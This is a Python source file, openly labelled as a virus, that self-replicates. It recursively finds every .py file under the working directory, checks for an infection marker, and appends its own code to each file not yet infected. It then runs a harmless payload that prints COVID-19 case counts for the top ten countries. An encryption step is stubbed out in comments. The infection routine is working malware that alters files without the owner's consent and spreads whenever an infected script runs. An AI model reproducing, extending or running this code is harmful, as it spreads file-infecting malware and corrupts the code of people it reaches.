### -_- VIRUS -_- ###
import glob,sys,re,base64,json,COVID19Py
### E & D START ###


### E & D  END ###

### INFECTION VECTOR ###

def getED(): # get encrypt and decrypt part
    edCode = []
    fileHandler = open(sys.argv[0],"r")
    lines = fileHandler.readlines()
    append = False
    for line in lines:
        if(line.startswith("### E & D START ###")):
            append = True
        if(append):
            edCode.append(line)
        
        if(line.startswith("### E & D  END ###")):
            append = False
    return edCode

def getVirusCode():
    virusCode = []
    fileHandler = open(sys.argv[0],"r")
    lines = fileHandler.readlines()
    append = True
    for line in lines:
        if(line.startswith("### E & D START ###")):
            append = False
        if(append):
            virusCode.append(line)
        
        if(line.startswith("### E & D  END ###")):
            append = True
    return virusCode

def find_victims():
    return glob.glob("**/*.py",recursive=True)

def infectVirus():
    victims = find_victims()
    victims.remove(sys.argv[0])
    for victim in victims:
        with open(victim,"r") as fh:
            codeLines = fh.readlines()
        with open(victim,"r") as fh:
            programCode = fh.read()

        infected = False
        for codeLine in codeLines:
            if("### -_- VIRUS -_- ###" in codeLine):
                infected = True
                break
        
        if not infected:
            newCode = []
            newCode.extend(programCode + "\n")

            #virusCode = getVirusCode()
            #encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))

            #newCode.extend(encryptedVirusCode.decode("utf-8"))
            newCode.extend(getED())
            newCode.extend(getVirusCode())
            fileHandler = open(victim,"w")
            #fileHandler.write(encodedCode.decode('utf-8'))
            fileHandler.writelines(newCode)
            fileHandler.close() 

### TRIGGER ###
def trigger():
    payload()

### PAYLOAD ###
def getCovidINFO():
    covid19 = COVID19Py.COVID19()
    locations = covid19.getLocations(rank_by='confirmed')
    print("Top-10 countries with highest coronavirus infections: ")
    for i in range(10):
        print(locations[i]['country'] + " " + str(locations[i]['latest']['confirmed']))
        i+=1

def payload():
    getCovidINFO()

if __name__ == "__main__":
    infectVirus()
    trigger()

### -_- VIRUS END -_- ###